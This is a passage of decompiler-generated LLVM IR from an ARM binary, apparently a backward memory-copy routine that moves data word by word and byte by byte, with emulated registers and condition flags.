  %v10_14dac = inttoptr i32 %v9_14dac to i32*
  %v11_14dac = load i32, i32* %v10_14dac, align 4
  store i32 %v11_14dac, i32* %lr.global-to-local, align 4
  %v12_14dac = add i32 %v0_14dac, 16
  store i32 %v12_14dac, i32* %r1.global-to-local, align 4
  %v4_14db0 = mul i32 %v2_14dac, 256
  %v5_14db0 = or i32 %v4_14db0, %v3_14da8
  store i32 %v5_14db0, i32* @r3, align 4
  %v3_14db4 = udiv i32 %v2_14dac, 16777216
  %v4_14db8 = mul i32 %v5_14dac, 256
  %v5_14db8 = or i32 %v4_14db8, %v3_14db4
  store i32 %v5_14db8, i32* %r4.global-to-local, align 4
  %v3_14dbc = udiv i32 %v5_14dac, 16777216
  %v4_14dc0 = mul i32 %v8_14dac, 256
  %v5_14dc0 = or i32 %v4_14dc0, %v3_14dbc
  store i32 %v5_14dc0, i32* %r5.global-to-local, align 4
  %v3_14dc4 = udiv i32 %v8_14dac, 16777216
  %v4_14dc8 = mul i32 %v11_14dac, 256
  %v5_14dc8 = or i32 %v4_14dc8, %v3_14dc4
  store i32 %v5_14dc8, i32* @ip, align 4
  %v1_14dcc = inttoptr i32 %v0_14dcc to i32*
  store i32 %v5_14db0, i32* %v1_14dcc, align 4
  %v3_14dcc = add i32 %v0_14dcc, 4
  %v4_14dcc = inttoptr i32 %v3_14dcc to i32*
  %v5_14dcc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14dcc, i32* %v4_14dcc, align 4
  %v6_14dcc = add i32 %v0_14dcc, 8
  %v7_14dcc = inttoptr i32 %v6_14dcc to i32*
  %v8_14dcc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_14dcc, i32* %v7_14dcc, align 4
  %v9_14dcc = add i32 %v0_14dcc, 12
  %v10_14dcc = inttoptr i32 %v9_14dcc to i32*
  %v11_14dcc = load i32, i32* @ip, align 4
  store i32 %v11_14dcc, i32* %v10_14dcc, align 4
  %v12_14dcc = add i32 %v0_14dcc, 16
  store i32 %v12_14dcc, i32* @r0, align 4
  %v0_14dd0 = load i32, i32* %r2.global-to-local, align 4
  %v1_14dd0 = add i32 %v0_14dd0, -16
  store i32 %v1_14dd0, i32* %r2.global-to-local, align 4
  %v3_14dd0 = sub i32 15, %v0_14dd0
  %v4_14dd0 = and i32 %v3_14dd0, %v0_14dd0
  %v5_14dd0 = icmp slt i32 %v4_14dd0, 0
  %v6_14dd0 = icmp slt i32 %v1_14dd0, 0
  %v2_14dd4 = xor i1 %v6_14dd0, %v5_14dd0
  br i1 %v2_14dd4, label %dec_label_pc_14dd8, label %dec_label_pc_14da8.dec_label_pc_14da8_crit_edge

dec_label_pc_14da8.dec_label_pc_14da8_crit_edge:  ; preds = %dec_label_pc_14da8
  %v0_14da8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_14dac.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14da8

dec_label_pc_14dd8:                               ; preds = %dec_label_pc_14da8
  %v2_14dd8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14dd8, i32* @r4, align 4
  %v5_14dd8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_14dd8, i32* @r5, align 4
  %v1_14ddc = add i32 %v0_14dd0, -4
  store i32 %v1_14ddc, i32* %r2.global-to-local, align 4
  %v3_14ddc = add i32 %v0_14dd0, 2147483632
  %v4_14ddc = and i32 %v1_14ddc, %v3_14ddc
  %v5_14ddc = icmp slt i32 %v4_14ddc, 0
  store i1 %v5_14ddc, i1* %cpsr_v.global-to-local, align 1
  %v6_14ddc = icmp slt i32 %v1_14ddc, 0
  store i1 %v6_14ddc, i1* %cpsr_n.global-to-local, align 1
  %v7_14ddc = icmp eq i32 %v1_14ddc, 0
  store i1 %v7_14ddc, i1* %cpsr_z.global-to-local, align 1
  %v2_14de0 = xor i1 %v6_14ddc, %v5_14ddc
  br i1 %v2_14de0, label %dec_label_pc_14dfc, label %dec_label_pc_14de4

dec_label_pc_14de4:                               ; preds = %dec_label_pc_14dd8, %dec_label_pc_14d98, %dec_label_pc_14de4
  %v1_14df0 = phi i32 [ %v4_14df0, %dec_label_pc_14de4 ], [ %v12_14dcc, %dec_label_pc_14dd8 ], [ %v0_14dcc76, %dec_label_pc_14d98 ]
  %v0_14de4 = load i32, i32* %lr.global-to-local, align 4
  %v3_14de4 = udiv i32 %v0_14de4, 16777216
  store i32 %v3_14de4, i32* %ip.global-to-local, align 4
  %v0_14de8 = load i32, i32* %r1.global-to-local, align 4
  %v1_14de8 = inttoptr i32 %v0_14de8 to i32*
  %v2_14de8 = load i32, i32* %v1_14de8, align 4
  store i32 %v2_14de8, i32* %lr.global-to-local, align 4
  %v4_14de8 = add i32 %v0_14de8, 4
  store i32 %v4_14de8, i32* %r1.global-to-local, align 4
  %v4_14dec = mul i32 %v2_14de8, 256
  %v5_14dec = or i32 %v4_14dec, %v3_14de4
  store i32 %v5_14dec, i32* @ip, align 4
  %v2_14df0 = inttoptr i32 %v1_14df0 to i32*
  store i32 %v5_14dec, i32* %v2_14df0, align 4
  %v3_14df0 = load i32, i32* @r0, align 4
  %v4_14df0 = add i32 %v3_14df0, 4
  store i32 %v4_14df0, i32* @r0, align 4
  %v0_14df4 = load i32, i32* %r2.global-to-local, align 4
  %v1_14df4 = add i32 %v0_14df4, -4
  store i32 %v1_14df4, i32* %r2.global-to-local, align 4
  %v3_14df4 = sub i32 3, %v0_14df4
  %v4_14df4 = and i32 %v3_14df4, %v0_14df4
  %v5_14df4 = icmp slt i32 %v4_14df4, 0
  %v6_14df4 = icmp slt i32 %v1_14df4, 0
  %v2_14df8 = xor i1 %v6_14df4, %v5_14df4
  br i1 %v2_14df8, label %dec_label_pc_14dfc.loopexit, label %dec_label_pc_14de4

dec_label_pc_14dfc.loopexit:                      ; preds = %dec_label_pc_14de4
  %v7_14df4 = icmp eq i32 %v0_14df4, 4
  store i1 %v5_14df4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_14df4, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_14df4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14dfc

dec_label_pc_14dfc:                               ; preds = %dec_label_pc_14dfc.loopexit, %dec_label_pc_14dd8
  %v0_14c4c61 = phi i32 [ %v1_14df4, %dec_label_pc_14dfc.loopexit ], [ %v1_14ddc, %dec_label_pc_14dd8 ]
  %v0_14dfc = load i32, i32* %r1.global-to-local, align 4
  %v1_14dfc = add i32 %v0_14dfc, -1
  store i32 %v1_14dfc, i32* @r1, align 4
  br label %bb140

dec_label_pc_14e04:                               ; preds = %dec_label_pc_14bb0
  %v1_14e04 = load i32, i32* @r2, align 4
  %v2_14e04 = add i32 %v1_14e04, %v0_14bb0
  store i32 %v2_14e04, i32* %r1.global-to-local, align 4
  %v2_14e08 = add i32 %v1_14e04, %v1_14bb0
  store i32 %v2_14e08, i32* %r0.global-to-local, align 4
  %v2_14e0c = add i32 %v1_14e04, -4
  store i32 %v2_14e0c, i32* %r2.global-to-local, align 4
  %v4_14e0c = sub i32 3, %v1_14e04
  %v5_14e0c = and i32 %v4_14e0c, %v1_14e04
  %v6_14e0c = icmp slt i32 %v5_14e0c, 0
  store i1 %v6_14e0c, i1* %cpsr_v.global-to-local, align 1
  %v7_14e0c = icmp slt i32 %v2_14e0c, 0
  store i1 %v7_14e0c, i1* %cpsr_n.global-to-local, align 1
  %v8_14e0c = icmp eq i32 %v1_14e04, 4
  store i1 %v8_14e0c, i1* %cpsr_z.global-to-local, align 1
  %v5_14e10 = icmp slt i32 %v1_14e04, 4
  br i1 %v5_14e10, label %bb150, label %dec_label_pc_14e14

dec_label_pc_14e14:                               ; preds = %dec_label_pc_14e04
  %v1_14e14 = urem i32 %v2_14e08, 4
  store i32 %v1_14e14, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14e14 = icmp eq i32 %v1_14e14, 0
  store i1 %v2_14e14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14e14, label %dec_label_pc_14e1c, label %dec_label_pc_14ebc

dec_label_pc_14e1c:                               ; preds = %dec_label_pc_14e14
  %v1_14e1c = urem i32 %v2_14e04, 4
  store i32 %v1_14e1c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14e1c = icmp eq i32 %v1_14e1c, 0
  store i1 %v2_14e1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14e1c, label %dec_label_pc_14e24, label %dec_label_pc_14ee8

dec_label_pc_14e24:                               ; preds = %dec_label_pc_14e1c, %dec_label_pc_14ee0
  %v0_14e3c37 = phi i32 [ %v2_14e08, %dec_label_pc_14e1c ], [ %v0_14f3020, %dec_label_pc_14ee0 ]
  %v0_14e3836 = phi i32 [ %v2_14e04, %dec_label_pc_14e1c ], [ %v0_14ee0, %dec_label_pc_14ee0 ]
  %v0_14e24 = phi i32 [ %v2_14e0c, %dec_label_pc_14e1c ], [ %v2_14ed8, %dec_label_pc_14ee0 ]
  %v2_14e24 = add i32 %v0_14e24, -8
  store i32 %v2_14e24, i32* %r2.global-to-local, align 4
  %v4_14e24 = sub i32 7, %v0_14e24
  %v5_14e24 = and i32 %v4_14e24, %v0_14e24
  %v6_14e24 = icmp slt i32 %v5_14e24, 0
  store i1 %v6_14e24, i1* %cpsr_v.global-to-local, align 1
  %v7_14e24 = icmp slt i32 %v2_14e24, 0
  store i1 %v7_14e24, i1* %cpsr_n.global-to-local, align 1
  %v8_14e24 = icmp eq i32 %v0_14e24, 8
  store i1 %v8_14e24, i1* %cpsr_z.global-to-local, align 1
  %v5_14e28 = icmp slt i32 %v0_14e24, 8
  br i1 %v5_14e28, label %dec_label_pc_14e74, label %dec_label_pc_14e2c

dec_label_pc_14e2c:                               ; preds = %dec_label_pc_14e24
  %v3_14e2c = load i32, i32* @r4, align 4
  %v5_14e2c = inttoptr i32 %v3_14e2c to i8*
  store i8* %v5_14e2c, i8** %stack_var_-8, align 4
  %v8_14e2c = load i32, i32* @lr, align 4
  %v2_14e30 = add i32 %v0_14e24, -28
  store i32 %v2_14e30, i32* %r2.global-to-local, align 4
  %v4_14e30 = sub i32 27, %v0_14e24
  %v5_14e30 = and i32 %v4_14e30, %v2_14e24
  %v6_14e30 = icmp slt i32 %v5_14e30, 0
  store i1 %v6_14e30, i1* %cpsr_v.global-to-local, align 1
  %v7_14e30 = icmp slt i32 %v2_14e30, 0
  store i1 %v7_14e30, i1* %cpsr_n.global-to-local, align 1
  %v8_14e30 = icmp eq i32 %v2_14e24, 20
  store i1 %v8_14e30, i1* %cpsr_z.global-to-local, align 1
  %v5_14e34 = icmp slt i32 %v2_14e24, 20
  br i1 %v5_14e34, label %dec_label_pc_14e50, label %dec_label_pc_14e38

dec_label_pc_14e38:                               ; preds = %dec_label_pc_14e2c, %dec_label_pc_14e38.dec_label_pc_14e38_crit_edge
  %v0_14e3c = phi i32 [ %v1_14e44, %dec_label_pc_14e38.dec_label_pc_14e38_crit_edge ], [ %v0_14e3c37, %dec_label_pc_14e2c ]
  %v0_14e38 = phi i32 [ %v0_14e38.pre, %dec_label_pc_14e38.dec_label_pc_14e38_crit_edge ], [ %v0_14e3836, %dec_label_pc_14e2c ]
  %v1_14e38 = add i32 %v0_14e38, -4
  %v2_14e38 = inttoptr i32 %v1_14e38 to i32*
  %v3_14e38 = load i32, i32* %v2_14e38, align 4
  %v4_14e38 = add i32 %v0_14e38, -8
  %v5_14e38 = inttoptr i32 %v4_14e38 to i32*
  %v6_14e38 = load i32, i32* %v5_14e38, align 4
  store i32 %v6_14e38, i32* %r4.global-to-local, align 4
  %v7_14e38 = add i32 %v0_14e38, -12
  %v8_14e38 = inttoptr i32 %v7_14e38 to i32*
  %v9_14e38 = load i32, i32* %v8_14e38, align 4
  store i32 %v9_14e38, i32* %ip.global-to-local, align 4
  %v10_14e38 = add i32 %v0_14e38, -16
  %v11_14e38 = inttoptr i32 %v10_14e38 to i32*
  %v12_14e38 = load i32, i32* %v11_14e38, align 4
  store i32 %v12_14e38, i32* %lr.global-to-local, align 4
  store i32 %v10_14e38, i32* %r1.global-to-local, align 4
  %v1_14e3c = add i32 %v0_14e3c, -16
  %v2_14e3c = inttoptr i32 %v1_14e3c to i32*
  store i32 %v3_14e38, i32* %v2_14e3c, align 4
  %v4_14e3c = add i32 %v0_14e3c, -12
  %v5_14e3c = inttoptr i32 %v4_14e3c to i32*
  %v6_14e3c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_14e3c, i32* %v5_14e3c, align 4
  %v7_14e3c = add i32 %v0_14e3c, -8
  %v8_14e3c = inttoptr i32 %v7_14e3c to i32*
  %v9_14e3c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_14e3c, i32* %v8_14e3c, align 4
  %v10_14e3c = add i32 %v0_14e3c, -4
  %v11_14e3c = inttoptr i32 %v10_14e3c to i32*
  %v12_14e3c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14e3c, i32* %v11_14e3c, align 4
  store i32 %v1_14e3c, i32* %r0.global-to-local, align 4
  %v0_14e40 = load i32, i32* %r1.global-to-local, align 4
  %v1_14e40 = add i32 %v0_14e40, -4
  %v2_14e40 = inttoptr i32 %v1_14e40 to i32*
  %v3_14e40 = load i32, i32* %v2_14e40, align 4
  store i32 %v3_14e40, i32* @r3, align 4
  %v4_14e40 = add i32 %v0_14e40, -8
  %v5_14e40 = inttoptr i32 %v4_14e40 to i32*
  %v6_14e40 = load i32, i32* %v5_14e40, align 4
  store i32 %v6_14e40, i32* %r4.global-to-local, align 4
  %v7_14e40 = add i32 %v0_14e40, -12
  %v8_14e40 = inttoptr i32 %v7_14e40 to i32*
  %v9_14e40 = load i32, i32* %v8_14e40, align 4
  store i32 %v9_14e40, i32* @ip, align 4
  %v10_14e40 = add i32 %v0_14e40, -16
  %v11_14e40 = inttoptr i32 %v10_14e40 to i32*
  %v12_14e40 = load i32, i32* %v11_14e40, align 4
  store i32 %v12_14e40, i32* %lr.global-to-local, align 4
  store i32 %v10_14e40, i32* %r1.global-to-local, align 4
  %v1_14e44 = add i32 %v0_14e3c, -32
  %v2_14e44 = inttoptr i32 %v1_14e44 to i32*
  store i32 %v3_14e40, i32* %v2_14e44, align 4
  %v4_14e44 = add i32 %v0_14e3c, -28
  %v5_14e44 = inttoptr i32 %v4_14e44 to i32*
  %v6_14e44 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_14e44, i32* %v5_14e44, align 4
  %v7_14e44 = add i32 %v0_14e3c, -24
  %v8_14e44 = inttoptr i32 %v7_14e44 to i32*
  %v9_14e44 = load i32, i32* @ip, align 4
  store i32 %v9_14e44, i32* %v8_14e44, align 4
  %v10_14e44 = add i32 %v0_14e3c, -20
  %v11_14e44 = inttoptr i32 %v10_14e44 to i32*
  %v12_14e44 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14e44, i32* %v11_14e44, align 4
  store i32 %v1_14e44, i32* %r0.global-to-local, align 4
  %v0_14e48 = load i32, i32* %r2.global-to-local, align 4
  %v2_14e48 = add i32 %v0_14e48, -32
  store i32 %v2_14e48, i32* %r2.global-to-local, align 4
  %v6_14e4c = icmp slt i32 %v0_14e48, 32
  br i1 %v6_14e4c, label %dec_label_pc_14e50.loopexit, label %dec_label_pc_14e38.dec_label_pc_14e38_crit_edge

dec_label_pc_14e38.dec_label_pc_14e38_crit_edge:  ; preds = %dec_label_pc_14e38
  %v0_14e38.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14e38

dec_label_pc_14e50.loopexit:                      ; preds = %dec_label_pc_14e38
  %v4_14e48 = sub i32 31, %v0_14e48
  %v5_14e48 = and i32 %v4_14e48, %v0_14e48
  %v6_14e48 = icmp slt i32 %v5_14e48, 0
  %v7_14e48 = icmp slt i32 %v2_14e48, 0
  store i1 %v6_14e48, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14e48, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14e50

dec_label_pc_14e50:                               ; preds = %dec_label_pc_14e50.loopexit, %dec_label_pc_14e2c
  %v6_14e58 = phi i32 [ %v1_14e44, %dec_label_pc_14e50.loopexit ], [ %v0_14e3c37, %dec_label_pc_14e2c ]
  %v0_14e60.pr = phi i32 [ %v2_14e48, %dec_label_pc_14e50.loopexit ], [ %v2_14e30, %dec_label_pc_14e2c ]
  %v4_14e50 = add i32 %v0_14e60.pr, 16
  %v6_14e50 = sub i32 0, %v0_14e60.pr
  %v7_14e50 = and i32 %v4_14e50, %v6_14e50
  %v8_14e50 = icmp slt i32 %v7_14e50, 0
  store i1 %v8_14e50, i1* %cpsr_v.global-to-local, align 1
  %v9_14e50 = icmp slt i32 %v4_14e50, 0
  store i1 %v9_14e50, i1* %cpsr_n.global-to-local, align 1
  %v10_14e50 = icmp eq i32 %v4_14e50, 0
  store i1 %v10_14e50, i1* %cpsr_z.global-to-local, align 1
  %v5_14e54 = icmp slt i32 %v0_14e60.pr, -16
  br i1 %v5_14e54, label %.thread2, label %bb147

bb147:                                            ; preds = %dec_label_pc_14e50
  %v6_14e54 = load i32, i32* %r1.global-to-local, align 4
  %v7_14e54 = add i32 %v6_14e54, -4
  %v8_14e54 = inttoptr i32 %v7_14e54 to i32*
  %v9_14e54 = load i32, i32* %v8_14e54, align 4
  store i32 %v9_14e54, i32* @r3, align 4
  %v10_14e54 = add i32 %v6_14e54, -8
  %v11_14e54 = inttoptr i32 %v10_14e54 to i32*
  %v12_14e54 = load i32, i32* %v11_14e54, align 4
  store i32 %v12_14e54, i32* %r4.global-to-local, align 4
  %v13_14e54 = add i32 %v6_14e54, -12
  %v14_14e54 = inttoptr i32 %v13_14e54 to i32*
  %v15_14e54 = load i32, i32* %v14_14e54, align 4
  store i32 %v15_14e54, i32* @ip, align 4
  %v16_14e54 = add i32 %v6_14e54, -16
  %v17_14e54 = inttoptr i32 %v16_14e54 to i32*
  %v18_14e54 = load i32, i32* %v17_14e54, align 4
  store i32 %v18_14e54, i32* %lr.global-to-local, align 4
  store i32 %v16_14e54, i32* %r1.global-to-local, align 4
  %v7_14e58 = add i32 %v6_14e58, -16
  %v8_14e58 = inttoptr i32 %v7_14e58 to i32*
  store i32 %v9_14e54, i32* %v8_14e58, align 4
  %v10_14e58 = add i32 %v6_14e58, -12
  %v11_14e58 = inttoptr i32 %v10_14e58 to i32*
  %v12_14e58 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_14e58, i32* %v11_14e58, align 4
  %v13_14e58 = add i32 %v6_14e58, -8
  %v14_14e58 = inttoptr i32 %v13_14e58 to i32*
  %v15_14e58 = load i32, i32* @ip, align 4
  store i32 %v15_14e58, i32* %v14_14e58, align 4
  %v16_14e58 = add i32 %v6_14e58, -4
  %v17_14e58 = inttoptr i32 %v16_14e58 to i32*
  %v18_14e58 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_14e58, i32* %v17_14e58, align 4
  store i32 %v7_14e58, i32* %r0.global-to-local, align 4
  %v6_14e5c = load i32, i32* %r2.global-to-local, align 4
  %v7_14e5c = add i32 %v6_14e5c, -16
  store i32 %v7_14e5c, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14e50, %bb147
  %v6_14e68 = phi i32 [ %v7_14e58, %bb147 ], [ %v6_14e58, %dec_label_pc_14e50 ]
  %v0_14e60 = phi i32 [ %v7_14e5c, %bb147 ], [ %v0_14e60.pr, %dec_label_pc_14e50 ]
  %v4_14e60 = add i32 %v0_14e60, 20
  store i32 %v4_14e60, i32* %r2.global-to-local, align 4
  %v6_14e60 = sub i32 0, %v0_14e60
  %v7_14e60 = and i32 %v4_14e60, %v6_14e60
  %v8_14e60 = icmp slt i32 %v7_14e60, 0
  store i1 %v8_14e60, i1* %cpsr_v.global-to-local, align 1
  %v9_14e60 = icmp slt i32 %v4_14e60, 0
  store i1 %v9_14e60, i1* %cpsr_n.global-to-local, align 1
  %v10_14e60 = icmp eq i32 %v4_14e60, 0
  store i1 %v10_14e60, i1* %cpsr_z.global-to-local, align 1
  %v5_14e64 = icmp slt i32 %v0_14e60, -20
  br i1 %v5_14e64, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_14e64 = load i32, i32* %r1.global-to-local, align 4
  %v7_14e64 = add i32 %v6_14e64, -4
  %v8_14e64 = inttoptr i32 %v7_14e64 to i32*
  %v9_14e64 = load i32, i32* %v8_14e64, align 4
  store i32 %v9_14e64, i32* @r3, align 4
  %v10_14e64 = add i32 %v6_14e64, -8
  %v11_14e64 = inttoptr i32 %v10_14e64 to i32*
  %v12_14e64 = load i32, i32* %v11_14e64, align 4
  store i32 %v12_14e64, i32* @ip, align 4
  %v13_14e64 = add i32 %v6_14e64, -12
  %v14_14e64 = inttoptr i32 %v13_14e64 to i32*
  %v15_14e64 = load i32, i32* %v14_14e64, align 4
  store i32 %v15_14e64, i32* %lr.global-to-local, align 4
  store i32 %v13_14e64, i32* %r1.global-to-local, align 4
  %v7_14e68 = add i32 %v6_14e68, -12
  %v8_14e68 = inttoptr i32 %v7_14e68 to i32*
  store i32 %v9_14e64, i32* %v8_14e68, align 4
  %v10_14e68 = add i32 %v6_14e68, -8
  %v11_14e68 = inttoptr i32 %v10_14e68 to i32*
  %v12_14e68 = load i32, i32* @ip, align 4
  store i32 %v12_14e68, i32* %v11_14e68, align 4
  %v13_14e68 = add i32 %v6_14e68, -4
  %v14_14e68 = inttoptr i32 %v13_14e68 to i32*
  %v15_14e68 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_14e68, i32* %v14_14e68, align 4
  store i32 %v7_14e68, i32* %r0.global-to-local, align 4
  %v6_14e6c = load i32, i32* %r2.global-to-local, align 4
  %v7_14e6c = add i32 %v6_14e6c, -12
  store i32 %v7_14e6c, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_14e8c45 = phi i32 [ %v6_14e68, %.thread2 ], [ %v7_14e68, %bb148 ]
  %v0_14e7443 = phi i32 [ %v4_14e60, %.thread2 ], [ %v7_14e6c, %bb148 ]
  %v2_14e70 = load i8*, i8** %stack_var_-8, align 4
  %v3_14e70 = ptrtoint i8* %v2_14e70 to i32
  store i32 %v3_14e70, i32* @r4, align 4
  store i32 %v8_14e2c, i32* @lr, align 4
  br label %dec_label_pc_14e74

dec_label_pc_14e74:                               ; preds = %dec_label_pc_14e24, %.thread4
  %v7_14e84 = phi i32 [ %v0_14e3c37, %dec_label_pc_14e24 ], [ %v6_14e8c45, %.thread4 ]
  %v0_14e74 = phi i32 [ %v2_14e24, %dec_label_pc_14e24 ], [ %v0_14e7443, %.thread4 ]
  %v2_14e74 = add i32 %v0_14e74, 8
  store i32 %v2_14e74, i32* %r2.global-to-local, align 4
  %v4_14e74 = sub i32 0, %v0_14e74
  %v5_14e74 = and i32 %v2_14e74, %v4_14e74
  %v6_14e74 = icmp slt i32 %v5_14e74, 0
  store i1 %v6_14e74, i1* %cpsr_v.global-to-local, align 1
  %v7_14e74 = icmp slt i32 %v2_14e74, 0
  store i1 %v7_14e74, i1* %cpsr_n.global-to-local, align 1
  %v8_14e74 = icmp eq i32 %v2_14e74, 0
  store i1 %v8_14e74, i1* %cpsr_z.global-to-local, align 1
  %v5_14e78 = icmp slt i32 %v0_14e74, -8
  br i1 %v5_14e78, label %bb150, label %dec_label_pc_14e7c

dec_label_pc_14e7c:                               ; preds = %dec_label_pc_14e74
  %v6_14e7c = add i32 %v0_14e74, 4
  store i32 %v6_14e7c, i32* %r2.global-to-local, align 4
  %v8_14e7c = sub i32 -5, %v0_14e74
  %v9_14e7c = and i32 %v8_14e7c, %v2_14e74
  %v10_14e7c = icmp slt i32 %v9_14e7c, 0
  store i1 %v10_14e7c, i1* %cpsr_v.global-to-local, align 1
  %v11_14e7c = icmp slt i32 %v6_14e7c, 0
  store i1 %v11_14e7c, i1* %cpsr_n.global-to-local, align 1
  %v12_14e7c = icmp eq i32 %v2_14e74, 4
  store i1 %v12_14e7c, i1* %cpsr_z.global-to-local, align 1
  %v5_14e80 = icmp slt i32 %v2_14e74, 4
  %v6_14e80 = load i32, i32* %r1.global-to-local, align 4
  %v7_14e80 = add i32 %v6_14e80, -4
  %v8_14e80 = inttoptr i32 %v7_14e80 to i32*
  %v9_14e80 = load i32, i32* %v8_14e80, align 4
  store i32 %v9_14e80, i32* @r3, align 4
  br i1 %v5_14e80, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_14e7c
  store i32 %v7_14e80, i32* %r1.global-to-local, align 4
  %v8_14e84 = add i32 %v7_14e84, -4
  %v9_14e84 = inttoptr i32 %v8_14e84 to i32*
  store i32 %v9_14e80, i32* %v9_14e84, align 4
  %v10_14e84 = load i32, i32* %r0.global-to-local, align 4
  %v11_14e84 = add i32 %v10_14e84, -4
  store i32 %v11_14e84, i32* %r0.global-to-local, align 4
  %v0_14e94.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_14e7c
  %v10_14e88 = add i32 %v6_14e80, -8
  %v11_14e88 = inttoptr i32 %v10_14e88 to i32*
  %v12_14e88 = load i32, i32* %v11_14e88, align 4
  store i32 %v12_14e88, i32* @ip, align 4
  store i32 %v10_14e88, i32* %r1.global-to-local, align 4
  %v7_14e8c = add i32 %v7_14e84, -8
  %v8_14e8c = inttoptr i32 %v7_14e8c to i32*
  store i32 %v9_14e80, i32* %v8_14e8c, align 4
  %v10_14e8c = add i32 %v7_14e84, -4
  %v11_14e8c = inttoptr i32 %v10_14e8c to i32*
  %v12_14e8c = load i32, i32* @ip, align 4
  store i32 %v12_14e8c, i32* %v11_14e8c, align 4
  store i32 %v7_14e8c, i32* %r0.global-to-local, align 4
  %v6_14e90 = load i32, i32* %r2.global-to-local, align 4
  %v7_14e90 = add i32 %v6_14e90, -4
  store i32 %v7_14e90, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %dec_label_pc_14e74, %dec_label_pc_14e04, %.thread14, %dec_label_pc_15038, %dec_label_pc_14fcc, %dec_label_pc_14f60, %bb149
  %v2_14e98 = phi i32 [ %v11_14e84, %.thread8 ], [ %v7_14e84, %dec_label_pc_14e74 ], [ %v2_14e08, %dec_label_pc_14e04 ], [ %v0_14f3020, %.thread14 ], [ %v2_14ea453, %dec_label_pc_15038 ], [ %v2_14ea452, %dec_label_pc_14fcc ], [ %v2_14ea451, %dec_label_pc_14f60 ], [ %v7_14e8c, %bb149 ]
  %v0_14e94 = phi i32 [ %v0_14e94.pre, %.thread8 ], [ %v2_14e74, %dec_label_pc_14e74 ], [ %v2_14e0c, %dec_label_pc_14e04 ], [ %v2_14ed8, %.thread14 ], [ %v0_14e9449, %dec_label_pc_15038 ], [ %v0_14e9448, %dec_label_pc_14fcc ], [ %v0_14e9447, %dec_label_pc_14f60 ], [ %v7_14e90, %bb149 ]
  %v1_14e94 = add i32 %v0_14e94, 4
  store i32 %v1_14e94, i32* %r2.global-to-local, align 4
  %v3_14e94 = sub i32 0, %v0_14e94
  %v4_14e94 = and i32 %v1_14e94, %v3_14e94
  %v5_14e94 = icmp slt i32 %v4_14e94, 0
  store i1 %v5_14e94, i1* %cpsr_v.global-to-local, align 1
  %v6_14e94 = icmp slt i32 %v1_14e94, 0
  store i1 %v6_14e94, i1* %cpsr_n.global-to-local, align 1
  %v7_14e94 = icmp eq i32 %v1_14e94, 0
  store i1 %v7_14e94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14e94, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_14e9c = add i32 %v0_14e94, 2
  %v3_14e9c = sub i32 -3, %v0_14e94
  %v4_14e9c = and i32 %v3_14e9c, %v1_14e94
  %v5_14e9c = icmp slt i32 %v4_14e9c, 0
  store i1 %v5_14e9c, i1* %cpsr_v.global-to-local, align 1
  %v6_14e9c = icmp slt i32 %v1_14e9c, 0
  store i1 %v6_14e9c, i1* %cpsr_n.global-to-local, align 1
  %v7_14e9c = icmp eq i32 %v1_14e94, 2
  store i1 %v7_14e9c, i1* %cpsr_z.global-to-local, align 1
  %v0_14ea0 = load i32, i32* %r1.global-to-local, align 4
  %v1_14ea0 = add i32 %v0_14ea0, -1
  %v2_14ea0 = inttoptr i32 %v1_14ea0 to i8*
  %v3_14ea0 = load i8, i8* %v2_14ea0, align 1
  %v4_14ea0 = zext i8 %v3_14ea0 to i32
  store i32 %v4_14ea0, i32* @r3, align 4
  store i32 %v1_14ea0, i32* %r1.global-to-local, align 4
  %v3_14ea4 = add i32 %v2_14e98, -1
  %v4_14ea4 = inttoptr i32 %v3_14ea4 to i8*
  store i8 %v3_14ea0, i8* %v4_14ea4, align 1
  %v5_14ea4 = load i32, i32* %r0.global-to-local, align 4
  %v6_14ea4 = add i32 %v5_14ea4, -1
  store i32 %v6_14ea4, i32* %r0.global-to-local, align 4
  %v0_14ea8 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_14ea8 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_14ea8 = xor i1 %v0_14ea8, %v1_14ea8
  br i1 %v2_14ea8, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_14ea8 = load i32, i32* %r1.global-to-local, align 4
  %v4_14ea8 = add i32 %v3_14ea8, -1
  %v5_14ea8 = inttoptr i32 %v4_14ea8 to i8*
  %v6_14ea8 = load i8, i8* %v5_14ea8, align 1
  %v7_14ea8 = zext i8 %v6_14ea8 to i32
  store i32 %v7_14ea8, i32* @r3, align 4
  store i32 %v4_14ea8, i32* %r1.global-to-local, align 4
